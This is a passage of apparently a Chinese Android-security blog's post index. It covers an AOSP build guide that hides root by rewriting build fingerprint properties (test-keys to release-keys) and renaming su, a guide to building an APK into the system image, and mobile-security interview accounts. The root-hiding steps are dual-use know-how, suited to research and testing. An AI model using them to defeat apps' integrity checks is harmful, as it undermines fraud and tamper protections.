plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">source build/envsetup.sh</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code5/1.png\" alt=\"image-20221109204852615\"></p>\n<p>我们随便打开一个配置文件进行添加，例如这里我们打开配置文件<code>device/google/marlin/vendorsetup.sh</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">vim device/google/marlin/vendorsetup.sh</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code5/2.png\" alt=\"image-20221109205524780\"></p>\n<p>我们也可以发现之前的userdebug版本声明也在这里面</p>\n<p>然后我们再次初始化并选择设备：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">source build/envsetup.sh</span><br><span class=\"line\">lunch</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code5/4.png\" alt=\"image-20221109205802480\"></p>\n<p>可以发现此时我们就多了user版本，然后我们选择该版本</p>\n<p>编译：make -j4</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code5/5.png\" alt=\"image-20221109214415835\"></p>\n<p>编译完成</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code5/6.png\" alt=\"image-20221109214957961\"></p>\n<p>我们可以发现现在就是user的版本，也没有root权限，和我们平时使用的手机一样</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code5/8.png\" alt=\"image-20221110152811681\"></p>\n<p>这里我们在网上找一个root检测工具，我们可以发现此时的手机是未经过root的</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code5/7.png\" alt=\"image-20221110152717522\"></p>\n<p>尽管我们现在编译的是user版本，但是我们试验了一些测试的APP，发现其中有一些APP还是检测系统含有root，经过分析我们发现，无论是user编译还是user-debug编译，我们的系统签名都使用的是test-key，而我们真正的手机一般是release-key签名后发布的，所以很多APP将这里作为检测点</p>\n<p>这里有两种方案：</p>\n<p>（1）编译release-key版本的系统</p>\n<p>由于后面我们还要开展指纹抹除实验，所以这里给大家推荐一个文章，想要实现可以去试下：<a href=\"https://blog.csdn.net/u010142437/article/details/78030485\">Android——编译release版签名系统</a></p>\n<p>（2）修改指纹</p>\n<p>我们这里为了简单的实验，后面在实验中将这里的进行抹除</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">test-keys---&gt;release-keys</span><br></pre></td></tr></table></figure>\n\n<p>然后为了开展后面的实现，我们尝试拿到user版本的指纹，由于此时无法root，所以无法查看 <code>/system/build.prop</code>的信息，所以我们直接对设备进行root</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">8.0刷入root步骤：</span><br><span class=\"line\">\t（1）刷入twrp</span><br><span class=\"line\">\t（2）使用twrp刷入Magisk</span><br><span class=\"line\">既可以获得root</span><br></pre></td></tr></table></figure>\n\n<p>针对Android8.0的设备获得root，最方便的便是刷入Magisk</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code5/9.png\" alt=\"image-20221110154909267\"></p>\n<p>此时我们再次查看设备的指纹：</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code5/10.png\" alt=\"image-20221110155025196\"></p>\n<p>可以发现此时我们可以找到指纹，这里我们保存该指纹信息</p>\n<h3 id=\"3-2-userdebug版本编译\"><a href=\"#3-2-userdebug版本编译\" class=\"headerlink\" title=\"3.2 userdebug版本编译\"></a>3.2 userdebug版本编译</h3><p>我们按上面的编译步骤选择userdebug版本</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code5/11.png\" alt=\"image-20221110160816195\"></p>\n<p>我们可以发现userdebug的指纹明显不一样，此时我们再查看一下</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code5/12.png\" alt=\"image-20221110161516506\"></p>\n<h3 id=\"3-3-root指纹抹除\"><a href=\"#3-3-root指纹抹除\" class=\"headerlink\" title=\"3.3 root指纹抹除\"></a>3.3 root指纹抹除</h3><p>前面我们分别对user版和debug版的系统进行了分析，相应不少朋友应对一些常见的root检测的应用进行处理，那能不能即获得root的操作，又拥有user一样的镜像呢，这里我们就需要对root进行定制和指纹抹除</p>\n<p>首先我们用文件对比工具来进行比较：</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code5/13.png\" alt=\"image-20221110162806579\"></p>\n<p>我们只需要将这些差异的地方一一进行修改即可</p>\n<p><strong>（1）test-keys</strong></p>\n<p>前面我们提到了这个问题，所以这里我们需要将其进行修改，这里直接将<code>test-keys</code>修改为<code>release-keys</code></p>\n<p>我们先查找一下位置：</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code5/14.png\" alt=\"image-20221110170717829\"></p>\n<p>然后我们搜索<code>ro.build.tags</code>，可以在<code>buildinfo.sh</code>中找到</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code5/15.png\" alt=\"image-20221110170923762\"></p>\n<p>然后我们继续定位后面的值，在<code>build/make/core/Makefile</code>中</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code5/16.png\" alt=\"image-20221110171154404\"></p>\n<p>这里我们直接修改为<code>release-keys</code></p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code5/17.png\" alt=\"image-20221110171500893\"></p>\n<p><strong>（2）ro.build.display.id</strong></p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code5/18.png\" alt=\"image-20221110171620174\"></p>\n<p>按照前面的思路进行定位：</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code5/19.png\" alt=\"image-20221110171748450\"></p>\n<p><code>build/make/core/Makefile</code></p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code5/20.png\" alt=\"image-20221110173324063\"></p>\n<p>这里我们将其值修改为和user保持一致</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code5/21.png\" alt=\"image-20221110173507737\"></p>\n<p>注意这里我们使用release-key</p>\n<p><strong>（3）ro.build.version.incremental</strong></p>\n<p>这里我们可以将<code>buildinfo.sh</code>和<code>Makefile文件都修改</code></p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code5/22.png\" alt=\"image-20221110183726699\"></p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code5/23.png\" alt=\"image-20221110183907866\"></p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code5/24.png\" alt=\"image-20221110183949373\"></p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code5/25.png\" alt=\"image-20221110184826773\"></p>\n<p>即我们修改<code>BF_BUILD_BUMBER</code>的值就可以了</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code5/26.png\" alt=\"image-20221110185028392\"></p>\n<p><strong>（4）ro.build.date和ro.build.date.utc</strong></p>\n<p>这两个是编译是时间，为了与后面保持一致，我们还是进行修改</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code5/49.png\" alt=\"image-20221110192341103\"></p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code5/48.png\" alt=\"image-20221110192320386\"></p>\n<p>然后我们进行修改：</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code5/50.png\" alt=\"image-20221110192458248\"></p>\n<p><strong>（5）ro.build.type</strong></p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code5/27.png\" alt=\"image-20221110185453548\"></p>\n<p><code>buildinfo.sh</code></p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code5/28.png\" alt=\"image-20221110185619811\"></p>\n<p><code>Makefile</code></p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code5/29.png\" alt=\"image-20221110185703907\"></p>\n<p>直接在此处修改即可</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code5/30.png\" alt=\"image-20221110185821794\"></p>\n<p><strong>（6）ro.build.user和ro.build.host</strong></p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code5/31.png\" alt=\"image-20221110190003376\"></p>\n<p><code>buildinfo.sh</code></p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code5/32.png\" alt=\"image-20221110190030377\"></p>\n<p>这里我们直接修改为用户名和主机</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code5/33.png\" alt=\"image-20221110190336611\"></p>\n<p><strong>（6）ro.build.flavor</strong></p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code5/35.png\" alt=\"image-20221110190538846\"></p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code5/34.png\" alt=\"image-20221110190502332\"></p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code5/36.png\" alt=\"image-20221110190643010\"></p>\n<p>然后我们直接进行修改</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code5/37.png\" alt=\"image-20221110190749792\"></p>\n<p><strong>（7）ro.build.description</strong></p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code5/40.png\" alt=\"image-20221110191315720\"></p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code5/38.png\" alt=\"image-20221110191035722\"></p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code5/39.png\" alt=\"image-20221110191132102\"></p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code5/41.png\" alt=\"image-20221110191528854\"></p>\n<p>应修改为：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">aosp_sailfish-user 8.1.0 OPM1.171019.011 eng.Windaa.20221109.050000 release-keys </span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code5/42.png\" alt=\"image-20221110191702936\"><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code5/43.png\" alt=\"image-20221110191739877\"></p>\n<p><strong>（8）ro.build.fingerprint</strong></p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code5/44.png\" alt=\"image-20221110191832725\"></p>\n<p>一样，我们进行定位</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code5/45.png\" alt=\"image-20221110191909861\"></p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code5/53.png\" alt=\"image-20221110213839174\"></p>\n<p>然后我们进行修改</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Android/aosp_sailfish/sailfish:8.1.0/OPM1.171019.011/Windaa11090500:user/release-keys</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code5/47.png\" alt=\"image-20221110213959934\"></p>\n<p><strong>（9）ro.product.model、ro.product.brand、ro.product.name</strong></p>\n<p>一些朋友想要设备向google的原设备一样，可以修改手机的代号和产品名称，这里就不修改了，感兴趣朋友可以修改</p>\n<h3 id=\"3-4-root定制\"><a href=\"#3-4-root定制\" class=\"headerlink\" title=\"3.4 root定制\"></a>3.4 root定制</h3><p>root定制这里参考通用的方法：xu为自定义的名称</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">AOSP/system/extras/su下修改Android.mk中su修改为xu</span><br><span class=\"line\">AOSP/system/core/libcutils/fs_config.cpp中/system/xbin/su修改为/system/xbin/xu</span><br><span class=\"line\">AOSP/system/sepolicy/private/file_contexts中/system/xbin/su修改为/system/xbin/xu</span><br></pre></td></tr></table></figure>\n\n<p>第一处</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code5/51.png\" alt=\"image-20221110193527770\"></p>\n<p>第二处</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code5/58.png\"></p>\n<p>第三处</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code5/52.png\" alt=\"image-20221110193712743\"></p>\n<h3 id=\"3-5编译\"><a href=\"#3-5编译\" class=\"headerlink\" title=\"3.5编译\"></a>3.5编译</h3><p>然后再次编译，选择user-debug版</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">lunch：24</span><br><span class=\"line\">make -j4</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code5/5.png\" alt=\"image-20221109214415835\"></p>\n<h3 id=\"3-6效果演示\"><a href=\"#3-6效果演示\" class=\"headerlink\" title=\"3.6效果演示\"></a>3.6效果演示</h3><p>我们重新刷机，刷机完成后，就可以发现定制的镜像和原理看起来一致</p>\n<p>定制后：</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code5/56.png\" alt=\"image-20221115142107682\"></p>\n<p>定制前（user版）：</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code5/8.png\" alt=\"image-20221110152811681\"></p>\n<p>我们可以试下，看能不能正常root</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code5/57.png\" alt=\"image-20221115142222210\"></p>\n<p>可以发现是没有问题的</p>\n<h2 id=\"4-总结\"><a href=\"#4-总结\" class=\"headerlink\" title=\"4.总结\"></a>4.总结</h2><p>本文编译了user版和user-debug版，并通过指纹定制将user-debug魔改为user版，为后续试验提供了更多的方便，相关文件后续上传github</p>\n<h2 id=\"5-参考文献\"><a href=\"#5-参考文献\" class=\"headerlink\" title=\"5.参考文献\"></a>5.参考文献</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://bbs.pediy.com/thread-273485.htm#msg_header_h2_0</span><br><span class=\"line\">http://lzonel.cn/3136.html</span><br><span class=\"line\">https://blog.csdn.net/u010142437/article/details/78030485</span><br><span class=\"line\">https://www.jianshu.com/p/dd6cca4ec27d</span><br></pre></td></tr></table></figure>\n\n","categories":["Android源码定制"],"tags":["逆向技术","root"]},{"title":"Android源码定制（6）——Android10无源码内置apk到系统","url":"/2022/12/15/code6/","content":"<h2 id=\"背景\"><a href=\"#背景\" class=\"headerlink\" title=\"背景\"></a>背景</h2><p>作者：退役debug选手</p>\n<p>环境 AOSP 10</p>\n<p>当我们经常编译AOSP后有可能需要全量更新我们的修改，全量更新就意味着之前我们手机上面安装的软件都清空了，等同于回复出厂设置，那么我们可不可以提前放入一些我们自己需要用的APP呢，刷机之后APP就不用重复安装了。</p>\n<span id=\"more\"></span>\n\n\n<h2 id=\"无源码内置apk到系统\"><a href=\"#无源码内置apk到系统\" class=\"headerlink\" title=\"无源码内置apk到系统\"></a>无源码内置apk到系统</h2><p>这一次我们先做一个无源码无so库的APP到系统中。</p>\n<p>有so库的下一篇实践。</p>\n<h3 id=\"准备工作\"><a href=\"#准备工作\" class=\"headerlink\" title=\"准备工作\"></a>准备工作</h3><p>准备好apk安装包，这个包也可以是自己的，也有可能是客户给的，只给成品不给源码。这是前提。</p>\n<p>比如我现在就编写了一个简单的无so的apk。</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code6/QQ%E6%88%AA%E5%9B%BE20221209105639.jpg\"></p>\n<p>App名字就是内置App。<br>编译成功之后先安装到手机看看运行情况，是否会崩溃等等检查。</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code6/QQ%E6%88%AA%E5%9B%BE20221209105800.jpg\"></p>\n<p>能看到我们的log正常输入，且App没有崩溃。<br>我们把这个apk复制到这里：<br>在源码目录下packages&#x2F;apps下创建一个目录，这个目录就是我们存放apk的目录。<br>创建MyApp目录，保存上面打包出来的apk文件，命名MyApp.apk。</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code6/QQ%E6%88%AA%E5%9B%BE20221209110011.jpg\"></p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code6/QQ%E6%88%AA%E5%9B%BE20221209110118.jpg\"></p>\n<p>创建Android.mk文件，文件内容是这样的。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">LOCAL_PATH:= $(call my-dir)</span><br><span class=\"line\"></span><br><span class=\"line\">include $(CLEAR_VARS)</span><br><span class=\"line\">LOCAL_MODULE := MyApp</span><br><span class=\"line\">LOCAL_MODULE_TAGS := optional</span><br><span class=\"line\">LOCAL_SRC_FILES := $(LOCAL_MODULE).apk</span><br><span class=\"line\">LOCAL_MODULE_CLASS := APPS</span><br><span class=\"line\">LOCAL_MODULE_SUFFIX := $(COMMON_ANDROID_PACKAGE_SUFFIX)</span><br><span class=\"line\">LOCAL_CERTIFICATE := PRESIGNED</span><br><span class=\"line\">include $(BUILD_PREBUILT)</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code6/QQ%E6%88%AA%E5%9B%BE20221209110753.jpg\"></p>\n<p>当我们加入到这个地方之后，是可以进行编译，但是无法加入到系统编译中，还需要修改另一个地方配置。</p>\n<p>这里有很多App，我们在build中搜索他们是怎么配置的。</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code6/QQ%E6%88%AA%E5%9B%BE20221209113113.jpg\"></p>\n<p>比如相机，我们找到了build&#x2F;make&#x2F;target&#x2F;product&#x2F;handleld_product.mk中有相机的配置，通常这种文件夹配置后面会有一个 \\反斜杠。我们模仿他们去配置就行。</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code6/QQ%E6%88%AA%E5%9B%BE20221209112953.jpg\"></p>\n<p>加入我们的apk的目录。</p>\n<h3 id=\"编译刷机\"><a href=\"#编译刷机\" class=\"headerlink\" title=\"编译刷机\"></a>编译刷机</h3><p>上面配置完成之后，我们开始编译。</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code6/QQ%E6%88%AA%E5%9B%BE20221209122537.jpg\"></p>\n<p>接下里是错误的操作，make -j4后我snod重新生成system.img，然后就刷入手机了。</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code6/QQ%E6%88%AA%E5%9B%BE20221209123246.jpg\"></p>\n<p>这个时候手机重启，直接显示分区坏了。。。</p>\n<p>具体原因不明，如果知道的大佬，还望告知。</p>\n<p>怎么抢救呢？刷入同代号的官方刷机包就行。这个我很早就准备好了，因为之前已经遇到过这个情况n次，我现在内心毫无波澜了。</p>\n<p>找到之前的刷机包，执行flash-all.sh就行了。<br>抢救回来之后，当然是继续刷，我们还没验证是否内置成功。<br>这一次就是全量刷入。</p>\n<p>进入源码目录</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">adb reboot bootloader</span><br><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\">重启手机到bl模式</span></span><br><span class=\"line\">fastboot devices</span><br><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\">看看设备是否链接了，有xxfaf devices就是连接了。开始刷机。</span></span><br><span class=\"line\">fastboot flashall -w</span><br></pre></td></tr></table></figure>\n\n<p>刷机完成正常开机，查看APP是否内置成功。</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code6/2022-12-09_03-03.png\"></p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code6/2022-12-09_03-30.png\"></p>\n<p>这里没有卸载选项的了</p>\n<p>打开App</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code6/2022-12-09_04-16.png\"></p>\n<p>成功了！</p>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>本文主要介绍了如何通过源码定制内置APP到Android系统，更多移动安全知识欢迎关注安全后厨！</p>\n","categories":["Android源码定制"],"tags":["逆向技术","内置apk"]},{"title":"移动安全面试（1）——2023届科大讯飞秋季招聘","url":"/2023/03/08/interview0001/","content":"<p>大家好！我是同学小B（小编修改），某末流985硕，我也分享一下我秋招其中一家公司的心得。作为一名研究生期间没有什么成果的同学，这里还希望各位大佬见谅！首先介绍一下本人，我是从事数据安全方向，之前实验室的一些项目中，也初步接触过移动安全的部分知识，不过大多是和隐私合规相关，不过在今年如此之卷的秋招，我处处碰壁后，就开始扩展了一下自己的知识面，进一步将移动安全的隐私合规的一些知识完善了一下。本人秋招期间应聘两家公司的移动安全岗位（科大讯飞和海康威视），今天和大家分享一下其中一家公司的面试心得。</p>\n<span id=\"more\"></span>\n<p>科大讯飞的面试总共有四轮：1轮hr综合面试 + 1轮技术初试  + 1轮技术复试  + 1轮技术加试</p>\n<p>**hr综合面试 **</p>\n<p>有一说一，科大讯飞这家面试是我遇到最奇怪，居然上来是hr综合面试，不过面试官都比较和蔼，hr面试基本和其他没有什么区别，很多其实就是考察你的表达能力，或者你的一些逻辑思维能力，比如他们会问：</p>\n<p>你为什么会选择做移动安全？</p>\n<p>你怎么规划你平时的学习的？</p>\n<p>你觉得工作之后怎么能进一步提升自己？</p>\n<p>你曾经遇到的最困难的事？</p>\n<p>考研为什么要跨考？</p>\n<p>等等</p>\n<p>我感觉其实大家hr面，只要放平心态都没什么问题。</p>\n<p><strong>第一轮技术初试：</strong></p>\n<p>第一轮初试是一个女面试官，在我面试那么多家公司，遇到安全类女面试官的次数好像还没有，对方也是很和蔼，问了一些我数据安全（分类分级、数据脱敏类的问题），侧重就放在隐私合规上面了。移动安全相关大概有：</p>\n<p>你了解哪些移动端的隐私合规检测的工具？</p>\n<p>你如何开展隐私合规检测的工作？</p>\n<p>静态检测和动态检测的优劣是什么？</p>\n<p>如果你来做隐私合规检测，你觉得现在行业内比较通用的方法是什么?</p>\n<p>(这里说实在很多我都是死记硬背，当时看了看平安的隐私合规沙龙以及群主星球类的一些知识，就背下来了)</p>\n<p>其中静态检测我说了更多关于nlp相关的东西，因为做数据分类分级的过程中对这些要擅长一点，平时和群主聊天也相互交流了一下，感觉还好。</p>\n<p>然后就是问了一下规则与nlp的优劣，当前nlp存在的一些问题</p>\n<p>基本这里就大致介绍，后面很多就是介绍科大他们的一些产品等等了</p>\n<p><strong>第二轮技术复试：</strong></p>\n<p>第二轮技术复试应该是他们的一个安全小组长的人吧，然后问的基本就是移动端相关的知识了</p>\n<p>隐私方面：</p>\n<p>主要问了一下项目的细节，里面隐私合规如何做到自动化的方法，其他倒是没有什么区别？</p>\n<p>移动端：</p>\n<p>Android里面的调试策略？反调试策略？怎么绕开反调试？针对你绕开反调试的方法怎么进行反制？</p>\n<p>这里就回答了个一半吧</p>\n<p>Android的脱壳技术了解么（这个我不太了解，就没继续问了）</p>\n<p>如何开发自动化的隐私合规检测工具，说一下思路？</p>\n<p>隐私合规动态检测有哪些方法？Xposed与frida的区别？</p>\n<p>等等</p>\n<p>后面就是同样的提问环节，通过询问好像科大里面移动安全就需求较少，不过问我后面除了做隐私合规，还可不可以做漏洞相关，我都表示可以，就结束了</p>\n<p><strong>第三轮技术加试：</strong></p>\n<p>本来我以为到第二轮结束，应该就完了，感觉也没啥问题要问的了。第三轮技术面试问的更多的是简历，将简历上项目都询问了一遍，然后问我预期薪资，我报了个中等的薪资，然后问了下期望的城市和手里有几个offer，大致这些情况就结束了。</p>\n<p>整体情况就是这些，很高兴能分享我的面试心得，希望能帮助到大家！</p>\n","categories":["移动安全面试"],"tags":["移动安全面试","面试"]},{"title":"移动安全面试（2）——2023届快手秋季招聘面试","url":"/2023/03/08/interview0002/","content":"<p>大家好，我是同学小F，某211硕士研究生，今天给大家介绍一下秋季的面试经历，今年秋招形势很难，投了好几家公司简历都没过，本科的时候也尝试找了下工作，当时基本大厂和国企基本拿了一些，后来保研就留在本校了，想着环境熟悉并且在原来的导师手下干活就没有去其他学校，今年在起初听到很多朋友说就业形势不好，其实也没想太多，然而真正等自己去找工作，才有点受打击。硕士期间主要在研究Android安全方向，漏洞、加壳与一些常见的逆向技术都有所涉及，硕士在校期间只发了一篇SCI 2区论文，一篇c会，然后就是实验室的各种项目经历了。</p>\n<span id=\"more\"></span>\n<p>秋招提前批开始时，尝试了一些大厂，例如字节无恒，倒是给面试机会，不过一面完后就被挂了，而例如车厂，蔚来简历没过，后来到正式批了，又尝试了一些手机厂，想着大部分手机厂应该招移动安全人员，小米、荣耀、vivo都没有过简历，虽然小米给笔试（不过我朋友双9的就直接面试了），这属实是将信心有点打击。后来又试了一些企业，也拿了大厂、中厂、国企的offer，不过经历了新冠后，觉得可能生活更加重要吧，现在考到家这边的国家电网，准备躺平了。</p>\n<p>最后结合自己的经历，给下半年秋招找工作的朋友一点建议，大家可以去实习，还是得去实习，实习经历很重要，再者安全很看成果，大家可以拿一些漏洞证书或CVE编号，以及打打ctf比赛，多在开源社区写写博客，制作开源工具等等，进一步提高自己知名度，硕士期间可能话还是可以发发高质量论文，这样之后的选择有很多，本来导师给我说继续本校硕博连读，不过想着自己读了太多年书了，所以就拒绝了，不过如果硕士期间有几篇不错论文，还是可以申请到很多高校读博的。</p>\n<p>说了有点多，今天给大家分享一下快手的面试经历：（一轮初始+两轮复试+一轮hr面）</p>\n<p><strong>一面：</strong></p>\n<p>快手一面的面试官很和蔼，感觉交谈很融洽：</p>\n<p><strong>基础知识：</strong></p>\n<p>进程与线程区别？</p>\n<p>计算机网络协议http与https的区别？</p>\n<p>Android上中间人抓包的原理？如何进行防护？如何进行对抗？还有哪些抓包方式？非root环境可以抓包嘛？说说方案？现有的一些最难的抓包情况是怎么样的？flutter有了解么？遇到这种情况怎么进行抓包？除了你提到的这些通用抓包方案？还有没有其他思路？</p>\n<p>Android动态加载壳、不落地加载壳、函数抽取壳的加壳原理以及脱壳方案？</p>\n<p>了解Hook么，说下当前常用的一些hook方式？Xposed与Frida的原理，Frida与ptrace的关系，Frida和IDA能同时使用么？Frida绕过的常见方式？</p>\n<p>IDA中F5防护的一些手段？</p>\n<p>了解签名校验么？Android的签名机制？一些常用的签名校验方式？如何进行绕过？</p>\n<p>了解重打包么？如何检测重打包？</p>\n<p>Android中的漏洞挖掘了解么，列举你知道的经典漏洞原理？</p>\n<p>问题大概就这些，然后最后面试官说道来我们手撕一道算法题，好像是一道简单题，有关排序问题的？给15问题在他们系统上写完？</p>\n<p><strong>二面：</strong></p>\n<p>二面问的感觉还挺深入的，好多问题没回答好？</p>\n<p>vmp虚拟化如何实现对字段的虚拟化？</p>\n<p>中断的具体汇编指令是哪个？   </p>\n<p>中断hook的一些实现的函数方法？ </p>\n<p>控制流平坦化的解决？ </p>\n<p>符号执行解决虚假控制流？</p>\n<p>frida的inlinehook具体修改哪几条指令？  </p>\n<p>Magisk怎么实现root？    </p>\n<p>Magisk和EdXposed的关系？</p>\n<p>Xposed为什么不能在Android8.0上使用？</p>\n<p>Android版本更新，机制的重大变化？</p>\n<p>Magisk怎么进行隐藏指纹信息？  </p>\n<p>不落地加载的基本原理？</p>\n<p>got表hook和plt表hook的区别？</p>\n<p>got表中有几种重定向的方式？</p>\n<p>为了么可以删除section节区？</p>\n<p>initarry的作用，可以没有initarry么？</p>\n<p>针so里面的不同点字符加密怎么解决？</p>\n<p>got表hook和inlinehook的优缺？</p>\n<p>Dex2c的分析手段？</p>\n<p>为什么Dex2C会影响性能？</p>\n<p>ollvm中的不透明谓词有了解么？ 针对不透明谓词是怎么解决的？</p>\n<p>Unicorn里面一些问题？</p>\n<p><strong>三面：</strong></p>\n<p>三面的面试官应该是一个组长，问的项目经历，然后就是两篇论文问了很多？</p>\n<p>创新点、数据集、以后怎么做？</p>\n<p>还有就是Android恶意应用对抗，现有的恶意应用中有很多对抗手段，是怎么进行考虑的，你来防护怎么做？</p>\n<p>以后的职业规划？</p>\n<p><strong>四面：</strong></p>\n<p>hr问了下移动安全的发展？</p>\n<p>Android的设备指纹防护？</p>\n<p>再就是就业地点，一些其他问题了？</p>\n<p>最后整体就是这样，希望大家找工作顺利，以后就膜拜各位安全大佬了。</p>\n","categories":["移动安全面试"],"tags":["移动安全面试","面试"]},{"title":"移动安全面试（3）——2023届绿盟秋季招聘面试","url":"/2023/03/08/interview0003/","content":"<p>大家好！我是小C，今天在这里分享一下我的面试经历，本人某中部211硕，本科期间学习网络工程，研究生期间跨考到信息安全专业，然后导师这边一个方向是做Android安全的，当时觉得比较感兴趣就选择了，自己属于比较佛系，然后对技术的激情可能也没有那么强烈，同们很多实验室的同学有搞Fuzz，有搞逆向的，自己前两年就到处整一整，感觉也没学到啥，好在幸运的是发了一篇二区sci，提前达到了毕业要求。</p>\n<span 